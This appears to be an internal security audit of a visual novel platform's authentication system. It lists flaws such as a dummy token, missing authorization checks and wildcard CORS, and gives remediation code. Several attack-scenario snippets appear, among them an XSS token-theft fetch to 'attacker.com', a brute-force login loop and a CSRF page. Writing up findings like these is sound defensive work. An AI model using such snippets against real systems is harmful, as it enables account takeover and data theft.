# Security Audit Report - TeyvatVN Authentication System

**Date:** November 29, 2025  
**Application:** TeyvatVN Visual Novel Platform  
**Audit Scope:** Authentication & Authorization System  
**Status:** ⚠️ **NOT PRODUCTION-READY** - Critical vulnerabilities identified

---

## Executive Summary

The TeyvatVN application implements a basic username/password authentication system with **strong password storage** but **critical authorization vulnerabilities**. While the password hashing implementation is industry-standard, the lack of proper token validation and authorization checks makes the system vulnerable to unauthorized data access.

**Overall Security Rating:** ⚠️ **D-** (Acceptable for local development only)

---

## 🔒 Current Security Strengths

### ✅ 1. Password Storage (Grade: A+)
**Location:** `backend_server/auth.py` (lines 10-15)

**Implementation:**
- Uses `bcrypt` with automatic salt generation
- Industry-standard hashing algorithm resistant to rainbow table attacks
- Passwords never stored in plaintext
- Constant-time password verification prevents timing attacks

**Code Reference:**
```python
def get_password_hash(password: str) -> str:
    pwd_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(pwd_bytes, salt)
    return hashed.decode('utf-8')
```

**Risk Level:** ✅ **LOW** - This implementation is secure

---

## 🚨 Critical Vulnerabilities

### ❌ 1. NO REAL TOKEN AUTHENTICATION (CRITICAL)
**Severity:** 🔴 **CRITICAL**  
**Location:** `backend_server/main.py` (line 70)

**Issue:**
The authentication system returns a hardcoded dummy token for ALL users:
```python
return {"status": "success", "username": request.username, "token": "dummy-token-for-mvp"}
```

**Impact:**
- All users receive the same token: `"dummy-token-for-mvp"`
- No way to verify user identity on subsequent requests
- Token provides zero security value

**Attack Scenario:**
```javascript
// Attacker doesn't even need to login
// Just needs to know a username to access their data
fetch("http://localhost:4000/api/library/alice")
  .then(res => res.json())
  .then(data => console.log("Stolen Alice's chapters:", data));
```

**Recommendation:** Implement JWT (JSON Web Tokens) with proper signing and expiration

---

### ❌ 2. NO AUTHORIZATION CHECKS (CRITICAL)
**Severity:** 🔴 **CRITICAL**  
**Location:** `backend_server/main.py` (lines 75-105)

**Issue:**
API endpoints accept username as a URL parameter without verifying the requester's identity:

```python
@app.get("/api/library/{username}")
def get_library(username: str):
    # In a real app, we would validate the token here to ensure the requester is the user
    if not auth.get_user(username):
        raise HTTPException(status_code=404, detail="User not found")
    
    chapters = utils.list_user_chapters(username)
    return {"status": "success", "username": username, "chapters": chapters}
```

**Impact:**
- **Any user can access any other user's data**
- User "alice" can read/modify user "bob's" chapters
- No access control whatsoever

**Affected Endpoints:**
- `GET /api/library/{username}` - Read any user's library
- `GET /api/chapter/{username}/{chapter_id}` - Read any user's chapters
- `POST /api/{username}/{chapter_id}` - Write to any user's account
- `POST /api/generate` - Generate chapters for any user

**Attack Scenario:**
```javascript
// User "alice" steals all of "bob's" chapters
const bobsChapters = await fetch("http://localhost:4000/api/library/bob");

// User "alice" overwrites "bob's" chapter
await fetch("http://localhost:4000/api/bob/chapter1", {
  method: "POST",
  body: JSON.stringify({ prompt: "Malicious content", char1: "X", char2: "Y", background: "Z" })
});
```

**Recommendation:** Implement token-based authorization on all protected endpoints

---

### ⚠️ 3. TOKEN STORED IN LOCALSTORAGE (MEDIUM)
**Severity:** 🟡 **MEDIUM**  
**Location:** `src/context/AuthContext.jsx` (lines 40-41)

**Issue:**
```javascript
localStorage.setItem("currentUser", data.username);
localStorage.setItem("authToken", data.token);
```

**Impact:**
- localStorage is accessible to all JavaScript code on the page
- Vulnerable to XSS (Cross-Site Scripting) attacks
- If an attacker injects malicious JavaScript, they can steal tokens

**Attack Scenario:**
```javascript
// Malicious script injected via XSS
const stolenToken = localStorage.getItem("authToken");
const stolenUser = localStorage.getItem("currentUser");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify({ token: stolenToken, user: stolenUser })
});
```

**Recommendation:** Use httpOnly cookies or sessionStorage with proper CSP headers

---

### ⚠️ 4. NO RATE LIMITING (MEDIUM)
**Severity:** 🟡 **MEDIUM**  
**Location:** `backend_server/main.py` (lines 54-70)

**Issue:**
Login and registration endpoints have no rate limiting

**Impact:**
- Attackers can attempt unlimited login attempts
- Vulnerable to brute-force password attacks
- No protection against credential stuffing attacks

**Attack Scenario:**
```python
# Attacker tries 100,000 common passwords
password_list = load_common_passwords()
for password in password_list:
    response = requests.post("http://localhost:4000/api/auth/login", 
                            json={"username": "alice", "password": password})
    if response.status_code == 200:
        print(f"Password found: {password}")
        break
```

**Recommendation:** Implement rate limiting (e.g., 5 attempts per minute per IP)

---

### ⚠️ 5. CORS ALLOWS ALL ORIGINS (MEDIUM)
**Severity:** 🟡 **MEDIUM**  
**Location:** `backend_server/main.py` (line 18)

**Issue:**
```python
allow_origins=["http://localhost:5137", "https://updates-limitations-favors-effectively.trycloudflare.com", "*"]
```

**Impact:**
- Wildcard `"*"` allows ANY website to make requests to your API
- Vulnerable to CSRF (Cross-Site Request Forgery)
- Malicious websites can make authenticated requests on behalf of users

**Attack Scenario:**
```html
<!-- Malicious website: evil.com -->
<script>
  // If user is logged into TeyvatVN, this request will succeed
  fetch("http://localhost:4000/api/generate", {
    method: "POST",
    credentials: "include",
    body: JSON.stringify({ prompt: "Spam content", username: "victim" })
  });
</script>
```

**Recommendation:** Remove wildcard and only allow your production frontend domain

---

### ⚠️ 6. NO PASSWORD STRENGTH REQUIREMENTS (LOW)
**Severity:** 🟢 **LOW**  
**Location:** `backend_server/main.py` (lines 54-63)

**Issue:**
No validation of password strength during registration

**Impact:**
- Users can create accounts with weak passwords like `"1"`, `"a"`, or `"password"`
- Increases vulnerability to brute-force attacks

**Current Behavior:**
```python
@app.post("/api/auth/register")
async def register(request: AuthRequest):
    if not request.username or not request.password:  # Only checks if not empty
        raise HTTPException(status_code=400, detail="Username and password required")
    # No strength validation!
```

**Recommendation:** Enforce minimum password requirements (8+ chars, mixed case, numbers)

---

### ⚠️ 7. NO HTTPS ENFORCEMENT (MEDIUM IN PRODUCTION)
**Severity:** 🟡 **MEDIUM** (for production deployment)  
**Location:** Application-wide

**Issue:**
- Application currently runs on HTTP
- Passwords and tokens transmitted in plaintext over the network

**Impact:**
- Man-in-the-middle attacks can intercept credentials
- Network sniffing can capture passwords
- **NOTE:** This is acceptable for localhost development

**Recommendation:** Enforce HTTPS in production with HSTS headers

---

## 📋 Prioritized Remediation Plan

### Priority 1: CRITICAL (Must Fix Before Production)

#### 1.1 Implement JWT Token Authentication
**Estimated Effort:** 4-6 hours  
**Files to Modify:** `backend_server/auth.py`, `backend_server/main.py`

**Implementation Steps:**
1. Install PyJWT library: `pip install pyjwt`
2. Create secret key for token signing (store in environment variable)
3. Implement token generation function:

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = os.getenv("JWT_SECRET_KEY")  # Generate with: secrets.token_hex(32)

def create_access_token(username: str) -> str:
    """Generate a JWT token for authenticated user."""
    payload = {
        "sub": username,  # Subject (username)
        "iat": datetime.utcnow(),  # Issued at
        "exp": datetime.utcnow() + timedelta(hours=24)  # Expires in 24 hours
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def verify_token(token: str) -> Optional[str]:
    """Verify JWT token and return username if valid."""
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload["sub"]
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

4. Update login endpoint to return real token:

```python
@app.post("/api/auth/login")
async def login(request: AuthRequest):
    if not auth.authenticate_user(request.username, request.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    token = create_access_token(request.username)
    return {"status": "success", "username": request.username, "token": token}
```

---

#### 1.2 Add Authorization Middleware
**Estimated Effort:** 3-4 hours  
**Files to Modify:** `backend_server/main.py`

**Implementation Steps:**
1. Create dependency for token verification:

```python
from fastapi import Header, HTTPException

async def get_current_user(authorization: str = Header(...)) -> str:
    """Dependency to extract and verify user from Authorization header."""
    if not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Invalid authorization header")
    
    token = authorization.replace("Bearer ", "")
    username = verify_token(token)
    return username
```

2. Protect all user-specific endpoints:

```python
@app.get("/api/library/{username}")
def get_library(
    username: str,
    current_user: str = Depends(get_current_user)
):
    # Verify the requester is accessing their own data
    if current_user != username:
        raise HTTPException(status_code=403, detail="Access denied")
    
    if not auth.get_user(username):
        raise HTTPException(status_code=404, detail="User not found")
    
    chapters = utils.list_user_chapters(username)
    return {"status": "success", "username": username, "chapters": chapters}
```

3. Update frontend to send token in Authorization header:

```javascript
// src/context/AuthContext.jsx
const response = await fetch(`${API_URL}/library/${username}`, {
    headers: {
        "Authorization": `Bearer ${token}`
    }
});
```

---

### Priority 2: HIGH (Should Fix Soon)

#### 2.1 Implement Rate Limiting
**Estimated Effort:** 2-3 hours  
**Files to Modify:** `backend_server/main.py`

**Implementation Steps:**
1. Install slowapi: `pip install slowapi`
2. Configure rate limiter:

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```

3. Apply rate limits to auth endpoints:

```python
@app.post("/api/auth/login")
@limiter.limit("5/minute")  # Max 5 login attempts per minute
async def login(request: Request, auth_request: AuthRequest):
    # ... existing code
```

---

#### 2.2 Tighten CORS Configuration
**Estimated Effort:** 30 minutes  
**Files to Modify:** `backend_server/main.py`

**Implementation:**
```python
# Remove wildcard, only allow your frontend domain
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",  # Development
        "https://your-production-domain.com"  # Production (add when deployed)
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)
```

---

#### 2.3 Add Password Strength Validation
**Estimated Effort:** 1-2 hours  
**Files to Modify:** `backend_server/auth.py`, `backend_server/main.py`

**Implementation:**
```python
import re

def validate_password_strength(password: str) -> tuple[bool, str]:
    """Validate password meets security requirements."""
    if len(password) < 8:
        return False, "Password must be at least 8 characters"
    if not re.search(r"[A-Z]", password):
        return False, "Password must contain at least one uppercase letter"
    if not re.search(r"[a-z]", password):
        return False, "Password must contain at least one lowercase letter"
    if not re.search(r"\d", password):
        return False, "Password must contain at least one number"
    return True, "Password is strong"

@app.post("/api/auth/register")
async def register(request: AuthRequest):
    if not request.username or not request.password:
        raise HTTPException(status_code=400, detail="Username and password required")
    
    # Validate password strength
    is_valid, message = validate_password_strength(request.password)
    if not is_valid:
        raise HTTPException(status_code=400, detail=message)
    
    # ... rest of registration logic
```

---

### Priority 3: MEDIUM (Nice to Have)

#### 3.1 Use httpOnly Cookies Instead of localStorage
**Estimated Effort:** 3-4 hours

**Benefits:**
- Cookies with httpOnly flag cannot be accessed by JavaScript
- Immune to XSS token theft
- Automatic inclusion in requests

**Implementation:**
```python
from fastapi.responses import JSONResponse

@app.post("/api/auth/login")
async def login(request: AuthRequest):
    if not auth.authenticate_user(request.username, request.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    token = create_access_token(request.username)
    
    response = JSONResponse(content={"status": "success", "username": request.username})
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,  # Cannot be accessed by JavaScript
        secure=True,    # Only sent over HTTPS
        samesite="strict",  # CSRF protection
        max_age=86400   # 24 hours
    )
    return response
```

---

#### 3.2 Implement Account Lockout
**Estimated Effort:** 2-3 hours

**Implementation:**
- Track failed login attempts per user
- Lock account after 5 consecutive failures
- Require password reset or time-based unlock (15 minutes)

---

#### 3.3 Add Session Management
**Estimated Effort:** 2-3 hours

**Features:**
- Track active sessions
- Allow users to view/revoke sessions
- Automatic session expiration after inactivity

---

## 🎯 Security Checklist for Production

Before deploying to production, ensure ALL of the following are completed:

- [ ] JWT token authentication implemented
- [ ] Authorization checks on all protected endpoints
- [ ] Rate limiting on authentication endpoints
- [ ] CORS restricted to production domain only
- [ ] Password strength requirements enforced
- [ ] HTTPS enabled with valid SSL certificate
- [ ] httpOnly cookies for token storage
- [ ] Account lockout after failed attempts
- [ ] Security headers configured (CSP, HSTS, X-Frame-Options)
- [ ] Environment variables for secrets (not hardcoded)
- [ ] Logging and monitoring for security events
- [ ] Regular security audits scheduled

---

## 📊 Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Risk Level | Priority |
|---------------|------------|--------|------------|----------|
| No Token Auth | High | Critical | 🔴 Critical | P1 |
| No Authorization | High | Critical | 🔴 Critical | P1 |
| localStorage XSS | Medium | High | 🟡 High | P2 |
| No Rate Limiting | High | Medium | 🟡 High | P2 |
| Open CORS | Medium | Medium | 🟡 Medium | P2 |
| Weak Passwords | Medium | Low | 🟢 Low | P3 |
| No HTTPS (prod) | High | High | 🟡 High | P1 |

---

## 📞 Contact & Questions

For questions about this security audit, please contact:
- **Development Team Lead:** [Your Name]
- **Security Team:** [Security Team Contact]

**Next Review Date:** [Set date for follow-up audit after fixes]

---

## Appendix: Code Locations

### Files Requiring Modification
1. `backend_server/auth.py` - Token generation and validation
2. `backend_server/main.py` - Authorization middleware and endpoint protection
3. `src/context/AuthContext.jsx` - Frontend token handling
4. `.env` - Add JWT_SECRET_KEY environment variable

### Dependencies to Install
```bash
# Backend
pip install pyjwt slowapi

# Generate secret key
python -c "import secrets; print(secrets.token_hex(32))"
```

---

**Document Version:** 1.0  
**Last Updated:** November 29, 2025  
**Classification:** Internal Use Only
